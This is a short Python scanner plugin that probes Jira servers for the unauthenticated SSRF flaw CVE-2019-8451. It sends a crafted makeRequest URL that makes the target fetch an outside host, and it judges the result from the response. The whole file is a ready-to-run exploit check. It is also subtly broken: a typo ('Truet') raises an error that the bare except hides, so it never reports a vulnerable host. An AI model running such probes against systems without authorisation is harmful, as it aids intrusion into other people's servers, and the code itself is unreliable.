#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ''
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "jira未授权ssrf(cve-2019-8451)漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  ssrf_url = 'http://www.baidu.com' 
  target = "/plugins/servlet/gadgets/makeRequest?url="
  url1 = url + target + url + '@' + ssrf_url
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5)
    if res.status_code == 200 and "set-cookie" in res.text:
      ret['ifbug'] = Truet
      res.close()
      return ret
    else:
      return ret
  except:
    return ret